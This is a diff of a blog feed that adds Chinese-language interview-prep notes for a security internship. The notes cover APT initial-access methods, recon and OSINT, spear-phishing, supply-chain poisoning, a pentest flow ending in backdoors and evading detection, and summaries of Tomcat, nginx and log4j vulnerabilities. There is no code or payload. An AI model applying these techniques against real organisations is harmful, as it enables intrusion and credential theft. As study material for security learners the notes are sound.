+&lt;h2 id=&#34;apt攻击手法是什么有哪些&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apt攻击手法是什么有哪些&#34;&gt;#&lt;/a&gt; APT攻击手法是什么，有哪些&lt;/h2&gt;
+&lt;h2 id=&#34;熟悉常见外网打点技术及内外攻击技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#熟悉常见外网打点技术及内外攻击技术&#34;&gt;#&lt;/a&gt; 熟悉常见外网打点技术及内外攻击技术&lt;/h2&gt;
+&lt;p&gt;（一）资产测绘与信息搜集（前置打点基础）&lt;br /&gt;
+外网打点技术，资产测绘与信息搜集&lt;br /&gt;
+域名资产探测&lt;br /&gt;
+子域名爆破、DNS 解析查询、旁站 / C 段查询、备案反查、证书透明度 CT 日志爬取、二级 / 三级域名遍历。&lt;br /&gt;
+端口 &amp;amp; 服务测绘&lt;br /&gt;
+Masscan、Nmap 全端口扫描，识别公网开放端口：80/443 (Web)、22 (SSH)、3389 (RDP)、3306 (MySQL)、5432 (Postgres)、6379 (Redis)、8080/8443 中间件、VPN (4433/1723)、防火墙管理口。&lt;br /&gt;
+指纹识别&lt;br /&gt;
+Web 中间件（Tomcat、WebLogic、JBoss、Nexus、Apache、IIS）、OA/ERP/ 协同系统（泛微、致远、用友、金蝶）、VPN（深信服、天融信、Forti）、路由防火墙、打印机、监控设备、Git/SVN 代码仓库。&lt;br /&gt;
+OSINT 开源情报&lt;br /&gt;
+官网公告、招聘、员工邮箱、GitHub/Gitee 泄露源码、网盘泄露配置、第三方平台泄露账号、供应商信息。&lt;br /&gt;
+（二）Web 服务漏洞打点（最主流外网入口）&lt;br /&gt;
+通用 Web 漏洞&lt;br /&gt;
+SQL 注入、XSS 跨站、文件上传、文件包含、目录遍历、SSRF、命令执行、逻辑越权、未授权访问、弱口令后台。&lt;br /&gt;
+中间件漏洞&lt;br /&gt;
+WebLogic 反序列化、Tomcat 弱口令 / 后门、Shiro 反序列化、Fastjson、Struts2、Nexus 未授权、Jenkins 命令执行。&lt;br /&gt;
+专用业务系统漏洞&lt;br /&gt;
+OA 漏洞、致远 / 泛微任意文件上传 / 命令执行、Exchange ProxyLogon/ProxyShell、Confluence RCE、通达后台漏洞、企业邮箱漏洞。&lt;br /&gt;
+（三）端口服务弱口令 &amp;amp; 未授权打点&lt;br /&gt;
+数据库：Redis 未授权访问、MySQL/MSSQL 弱口令、Mongo 未授权、Elasticsearch 未授权漏洞。&lt;br /&gt;
+远程管理：SSH 弱口令、RDP 爆破、VNC 无密码、WinRM 未授权。&lt;br /&gt;
+缓存 / 消息队列：Redis 写 Webshell、RabbitMQ 弱口令、Kafka 未授权。&lt;br /&gt;
+代码仓库：Git/SVN 泄露源码、Gogs/GitLab 弱口令、未授权访问。&lt;br /&gt;
+（四）边界设备专项打点&lt;br /&gt;
+SSL VPN/IPSec VPN：弱口令、漏洞 RCE、验证码绕过、短信验证码爆破、Cookie 伪造。&lt;br /&gt;
+防火墙、负载均衡：管理后台弱口令、命令执行、后台未授权。&lt;br /&gt;
+路由器、摄像头、打印机：固件漏洞、默认账号、远程命令执行。&lt;br /&gt;
+（五）钓鱼类外网打点（APT 高频）&lt;br /&gt;
+鱼叉钓鱼邮件：伪造合作伙伴、法务、招标，宏 Office、恶意 LNK、PDF 漏洞、钓鱼站点。&lt;br /&gt;
+仿站钓鱼：仿 VPN、OA、企业邮箱登录页窃取账号密码。&lt;br /&gt;
+社交钓鱼：企业微信、钉钉、LinkedIn 定向发送恶意文件 / 链接。&lt;br /&gt;
+（六）供应链第三方打点&lt;br /&gt;
+攻击厂商、外包系统、开源组件投毒，利用企业对外采购的工具、更新服务器实现外网入口。&lt;/p&gt;
+&lt;h1 id=&#34;面试过程遇到的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#面试过程遇到的问题&#34;&gt;#&lt;/a&gt; 面试过程遇到的问题&lt;/h1&gt;
+&lt;p&gt;⭐⭐⭐⭐⭐&lt;/p&gt;
+&lt;p&gt;首先，你得了解各个常见漏洞的 &lt;mark&gt;成因、类别、防护（修复）、绕过、区别、能做什么&lt;/mark&gt;&lt;br /&gt;
+这里的漏洞有：&lt;br /&gt;
+SQL注入、XSS注入、CSRF、SSRF、文件上传漏洞、XXE（XML External Entity Injection（XML 外部实体注入））漏洞、任意文件下载漏洞&lt;/p&gt;
+&lt;p&gt;一、基础个人 &amp;amp; 教育类问题（开场必问）&lt;br /&gt;
+简单做一下自我介绍。&lt;br /&gt;
+你为什么选择信息安全这个专业？&lt;br /&gt;
+在校绩点专业前 5%，平时是怎么平衡专业课学习和实战练习的？&lt;br /&gt;
+你目前大四 / 在读，课余时间主要深耕网络安全哪一块方向？&lt;br /&gt;
+籍贯河南，为什么考虑来我们城市 / 公司工作？&lt;br /&gt;
+二、专业技能类问题（技术核心考察）&lt;/p&gt;
+&lt;p&gt;讲讲 OWASP TOP10 包含哪些漏洞，你最擅长哪几类？&lt;/p&gt;
+&lt;p&gt;详细说下SQL 注入的&lt;mark&gt;原理&lt;/mark&gt;、&lt;mark&gt;分类&lt;/mark&gt;、利用方式和防御手段？&lt;/p&gt;
+&lt;p&gt;你如果已经SQL注入成功了，结下来你怎么做&lt;/p&gt;
+&lt;p&gt;XSS 跨站脚本有哪几种类型？各自怎么触发、如何修复？&lt;br /&gt;
+CSRF 漏洞的成因是什么？和 XSS 有什么区别？常用防御方案？&lt;br /&gt;
+文件上传漏洞的绕过思路有哪些？日常如何防护？&lt;br /&gt;
+命令执行漏洞一般出现在什么场景，如何检测和防御？&lt;/p&gt;
+&lt;p&gt;完整的渗透测试流程&lt;/p&gt;
+&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;完整的渗透测试流程&lt;/summary&gt;&lt;div&gt;
+&lt;p&gt;请你简单描述一次渗透测试的完整流程，尤其是你在项目中如何规划每一步的。&lt;br /&gt;
+一次完整的渗透测试通常从信息收集开始，我会使用工具收集目标的所有公开信息，如IP地址、域名、端口等。接&lt;br /&gt;
+下来，我会进行漏洞扫描，寻找常见的漏洞，如SQL注入、XSS等。发现漏洞后，我会尝试利用这些漏洞获取系&lt;br /&gt;
+统控制权，并通过权限提升获取更高的权限。最后，我会通过设置后门等方法实现持久化访问。&lt;br /&gt;
+整个流程不仅需要技术支持，还要根据目标的安全防护策略灵活调整渗透方式，确保在不被发现的情况下达成目&lt;br /&gt;
+标。&lt;/p&gt;
+&lt;/div&gt;&lt;/details&gt;
+&lt;p&gt;RCE&lt;/p&gt;
+&lt;p&gt;条件竞争漏洞原理与举例&lt;/p&gt;
+&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;条件竞争&lt;/summary&gt;&lt;div&gt;
+&lt;p&gt;条件竞争（Race Condition）漏洞原理 + 实例&lt;br /&gt;
+一、核心原理&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;基础概念&lt;br /&gt;
+条件竞争漏洞（Race condition）官方概念是“发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。” 这个漏洞存在于操作系统、数据库、web等多个层面，像有名的脏牛（dirty cow）。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;标准不安全流程（存在竞争窗口）：&lt;br /&gt;
+判断资源状态（如判断文件不存在 if(!file_exists(&amp;quot;/tmp/tmp.txt&amp;quot;))）&lt;br /&gt;
+间隔时间窗口（几毫秒，并发可精准利用）&lt;br /&gt;
+执行操作（创建文件、写入、删除、权限修改）&lt;br /&gt;
+漏洞本质：校验和操作非原子化，中间存在可被利用的时间间隙。&lt;br /&gt;
+2. 关键前提&lt;br /&gt;
+共享资源可被多请求同时访问；&lt;br /&gt;
+校验逻辑与修改逻辑分离，无原子锁；&lt;br /&gt;
+攻击者可控请求并发速度，精准卡在时间窗口操作资源。&lt;/p&gt;
+&lt;/div&gt;&lt;/details&gt;
+&lt;p&gt;宽字节注入&lt;/p&gt;
+&lt;p&gt;反序列化&lt;/p&gt;
+&lt;p&gt;说一下并发漏洞&lt;/p&gt;
+&lt;p&gt;简述你的职业规划&lt;/p&gt;
+&lt;p&gt;简述shiro反序列化&lt;/p&gt;
+&lt;p&gt;对称加密与非对称加密、&lt;/p&gt;
+&lt;p&gt;Python 反弹shell&lt;/p&gt;
+&lt;p&gt;给你一个URL你会怎么做&lt;/p&gt;
+&lt;p&gt;Linux如果有一个挖矿病毒，你会如何做；如果有一个勒索病毒，你如何做&lt;/p&gt;
+&lt;p&gt;你有什么想问面试官的吗&lt;/p&gt;
+&lt;p&gt;信息收集的方式&lt;/p&gt;
+&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;信息收集的方式&lt;/summary&gt;&lt;div&gt;
+&lt;p&gt;信息收集方式（渗透测试/网络安全通用）&lt;br /&gt;
+一、公开渠道被动信息收集（Passive，不触碰目标服务器）&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;域名&amp;amp;备案信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;WHOIS查询：注册人、手机号、邮箱、注册时间、DNS服务器&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;工信部备案：企业名称、法人、备案地址、关联域名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;企查查/天眼查：企业工商信息、股东、分支机构、关联公司、联系方式&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DNS信息收集&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;DNS解析记录：A、AAAA、CNAME、MX、TXT、NS记录&lt;/li&gt;
+&lt;li&gt;子域名挖掘：证书透明度CT日志、搜索引擎、第三方子域名库&lt;/li&gt;
+&lt;li&gt;反向DNS、DNS区域传送漏洞&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;搜索引擎及社工&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;百度、谷歌、搜狗语法：site、inurl、filetype、intitle&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络空间测绘：Shodan、FOFA、Censys，查IP端口、设备型号、banner&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;代码托管平台：GitHub/Gitee/GitLab，搜索公司关键词找泄露源码、密钥、数据库地址&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;社交平台：微信公众号、微博、知乎、企业群，获取员工姓名、工号、邮箱、内部系统名称&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;历史快照：Wayback Machine网页存档，查看下线旧页面、后台路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;证书、邮件、爬虫数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;SSL证书：获取域名列表、企业名称&lt;/li&gt;
+&lt;li&gt;邮箱搜集：公开新闻、招聘、官网底部，整理员工邮箱用于钓鱼、爆破&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;二、主动信息收集（Active，直接和目标网络交互）&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;主机存活探测&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;ICMP：ping、arping（内网）&lt;/li&gt;
+&lt;li&gt;TCP/UDP端口扫描：Nmap、Masscan，探测开放端口、服务版本、操作系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;端口与服务识别&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;抓取Banner：识别Apache、Nginx、Tomcat、MySQL、Redis、FTP等版本&lt;/li&gt;
+&lt;li&gt;漏洞匹配：根据服务版本对应CVE漏洞&lt;/li&gt;
+&lt;li&gt;弱口令探测：FTP、SSH、3389、数据库、后台管理端口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;Web站点信息探测&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;目录扫描：Dirsearch、Dirmap、御剑，扫描后台、上传、备份、管理页面&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;指纹识别：CMS（织梦、ThinkPHP、Shiro、SpringBoot）、前端框架、中间件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;爬虫遍历全站：获取接口、参数、页面功能、文件上传点、登录入口&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;工具探测：AWVS、Xray、Nessus自动化爬取站点资产&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内网信息收集（拿到权限后）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;网段扫描、ARP扫描、路由、网关、DHCP服务器&lt;/li&gt;
+&lt;li&gt;域信息：域控、域用户、共享文件夹、组策略、内网数据库&lt;/li&gt;
+&lt;li&gt;本机信息：操作系统版本、进程、服务、账户、浏览器密码、配置文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;三、社工类信息收集（社会工程学）&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;公开社交信息：员工朋友圈、抖音、脉脉，收集姓名、生日、手机号、部门&lt;/li&gt;
+&lt;li&gt;钓鱼：伪造邮件/二维码/登录页面，诱导输入账号密码、上传文件&lt;/li&gt;
+&lt;li&gt;电话社工：伪装运维、快递、厂商套取内网地址、账号、服务器密码&lt;/li&gt;
+&lt;li&gt;线下：公司海报、工牌、办公文档、废弃打印纸获取内部信息&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;四、其他辅助收集手段&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;流量抓包：Wireshark、Burp抓HTTP/HTTPS请求，获取接口、Cookie、参数&lt;/li&gt;
+&lt;li&gt;流量镜像/日志：服务器访问日志、防火墙日志，分析访问IP、路径&lt;/li&gt;
+&lt;li&gt;APP/小程序抓包：反编译、抓接口，获取后端域名、API密钥&lt;/li&gt;
+&lt;li&gt;第三方泄露库：社工库、泄露数据库，查询泄露账号密码、手机号&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;&lt;/details&gt;
+&lt;p&gt;常见的中间件漏洞：&lt;br /&gt;
+tomcat：&lt;br /&gt;
+示例目录泄露：session样例（/examples/servlets/servlet/SessionExample）允许用户对session进行操纵，攻击者可以利用绕过网站验证机制直接登录后台。&lt;br /&gt;
+tomcat弱口令&lt;br /&gt;
+一、Tomcat 任意文件写入（CVE-2017-12615）&lt;br /&gt;
+Tomcat配置文件/conf/web.xml 配置了可写（readonly =false），导致可以使用PUT方法上传任意文件，攻击者将精心构造的payload向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行&lt;br /&gt;
+二、Tomcat 远程代码执行（CVE-2019-0232）&lt;br /&gt;
+三、Tomcat session反序列化（CVE-2020-9484）&lt;br /&gt;
+当使用tomcat时，如果使用了tomcat提供的session 持久化功能，就会在一次会话中尝试读取session文件中的内容，并进行反序列化。&lt;br /&gt;
+四、tomcat弱口令&amp;amp;后台getshell&lt;/p&gt;
+&lt;p&gt;nginx：&lt;br /&gt;
+Nginx CVE-2026-42945&lt;br /&gt;
+影响版本：2008 年发布的0.6.27 版本到最新的1.30.0 版本&lt;br /&gt;
+ngx_http_rewrite_module重写模块中一个极其隐蔽的逻辑错误——内部标志位管理错误；is_args 标志位失控：&lt;br /&gt;
+当 rewrite 替换串中包含?符号时：&lt;br /&gt;
+1.第一遍扫描：计算目标缓冲区所需长度。此时is_args=1，会额外加上 args 的长度&lt;br /&gt;
+2.分配内存：按计算出的长度分配堆内存&lt;br /&gt;
+3.第二遍扫描：实际拷贝数据。此时is_args仍然为 1，但实际拷贝时并没有拷贝 args 的内容&lt;br /&gt;
+分配的长度 &amp;gt; 实际写入的长度 + 后续操作，为堆缓冲区溢出创造了条件。&lt;/p&gt;
+&lt;p&gt;Nginx相关漏洞类型&lt;br /&gt;
+认证和授权漏洞：例如未正确验证用户身份、未授权访问、访问控制不当等问题。&lt;br /&gt;
+输入验证漏洞：例如未正确过滤和验证用户输入的数据，导致注入攻击、跨站脚本攻击等安全问题。&lt;br /&gt;
+安全配置漏洞：例如配置错误或不当的安全设置，如使用默认密码、禁用了重要的安全功能等。&lt;br /&gt;
+逻辑漏洞：例如不正确的逻辑判断、缺少合适的错误处理等问题。&lt;br /&gt;
+缓冲区溢出漏洞：例如未正确限制用户输入数据大小，导致溢出攻击等问题。&lt;br /&gt;
+拒绝服务漏洞：例如攻击者利用Nginx的特定漏洞进行拒绝服务攻击，导致服务器崩溃或无法响应用户请求。&lt;br /&gt;
+Nginx相关高危漏洞案例&lt;br /&gt;
+CVE-2013-2028：使用PUT或DELETE方法可导致任意文件覆盖漏洞。&lt;br /&gt;
+CVE-2013-4547：由于Nginx未正确处理不合法的HTTP头，攻击者可利用此漏洞进行拒绝服务攻击。&lt;br /&gt;
+CVE-2014-0133：由于Nginx未正确处理分块编码的HTTP请求，攻击者可利用此漏洞进行拒绝服务攻击。&lt;br /&gt;
+CVE-2017-7529：由于Nginx未正确处理特定的HTTP请求，攻击者可利用此漏洞进行拒绝服务攻击。、&lt;br /&gt;
+Nginx缓存溢出漏洞（CVE-2017-7529）&lt;/p&gt;
+&lt;p&gt;log4j 对应的是 CVE-2017-5645，即 Apache Log4j Server 反序列化命令执行漏洞；&lt;/p&gt;
+&lt;p&gt;log4j2  对应的是 CVE-2021-44228，即 log4j2 远程代码执行漏洞，通过 JNDI 注入实现； CSDN收藏&lt;/p&gt;
+</content>
+        <category term="个人实习" scheme="https://adm1n10086.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%AE%9E%E4%B9%A0/" />
         <updated>2026-05-12T16:00:00.000Z</updated>
     </entry>
     <entry>
@@ -2891,20 +3189,6 @@ http://192.168.142.141:9200_mapping?pretty=true&lt;/p&gt;
         <updated>2026-04-22T16:00:00.000Z</updated>
     </entry>
     <entry>
-        <id>https://adm1n10086.github.io/2026/04/16/markdown%E8%AF%AD%E6%B3%95/</id>
-        <title>ShokaX特殊语法及MarkDown语法</title>
-        <link rel="alternate" href="https://adm1n10086.github.io/2026/04/16/markdown%E8%AF%AD%E6%B3%95/"/>
-        <content type="html">&lt;h1 id=&#34;shokax特殊语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shokax特殊语法&#34;&gt;#&lt;/a&gt; ShokaX特殊语法&lt;/h1&gt;
-&lt;h2 id=&#34;参考文献&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文献&#34;&gt;#&lt;/a&gt; 参考文献&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://koharu.cosine.ren/post/note/shoka-features&#34;&gt;Shoka 主题 Markdown 语法演示&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&#34;markdown语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#markdown语法&#34;&gt;#&lt;/a&gt; MarkDown语法&lt;/h1&gt;
-&lt;h2 id=&#34;参考文献-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文献-2&#34;&gt;#&lt;/a&gt; 参考文献&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://markdown.com.cn/basic-syntax/&#34;&gt;Markdown教程&lt;/a&gt;&lt;/p&gt;
-</content>
-        <category term="ShokaX" scheme="https://adm1n10086.github.io/tags/ShokaX/" />
-        <updated>2026-04-15T16:00:00.000Z</updated>
-    </entry>
-    <entry>
         <id>https://adm1n10086.github.io/2026/04/16/Apache%20Http%20Server%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</id>
         <title>Apache Http Server路径穿越漏洞（CVE-2021-41773）</title>
         <link rel="alternate" href="https://adm1n10086.github.io/2026/04/16/Apache%20Http%20Server%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/"/>
@@ -3095,6 +3379,20 @@ l++ 此时 l =3&lt;br /&gt;
 </content>
         <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
         <category term="漏洞复现" scheme="https://adm1n10086.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
+        <updated>2026-04-15T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://adm1n10086.github.io/2026/04/16/markdown%E8%AF%AD%E6%B3%95/</id>
+        <title>ShokaX特殊语法及MarkDown语法</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/04/16/markdown%E8%AF%AD%E6%B3%95/"/>
+        <content type="html">&lt;h1 id=&#34;shokax特殊语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shokax特殊语法&#34;&gt;#&lt;/a&gt; ShokaX特殊语法&lt;/h1&gt;
+&lt;h2 id=&#34;参考文献&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文献&#34;&gt;#&lt;/a&gt; 参考文献&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://koharu.cosine.ren/post/note/shoka-features&#34;&gt;Shoka 主题 Markdown 语法演示&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;markdown语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#markdown语法&#34;&gt;#&lt;/a&gt; MarkDown语法&lt;/h1&gt;
+&lt;h2 id=&#34;参考文献-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文献-2&#34;&gt;#&lt;/a&gt; 参考文献&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://markdown.com.cn/basic-syntax/&#34;&gt;Markdown教程&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="ShokaX" scheme="https://adm1n10086.github.io/tags/ShokaX/" />
         <updated>2026-04-15T16:00:00.000Z</updated>
     </entry>
     <entry>
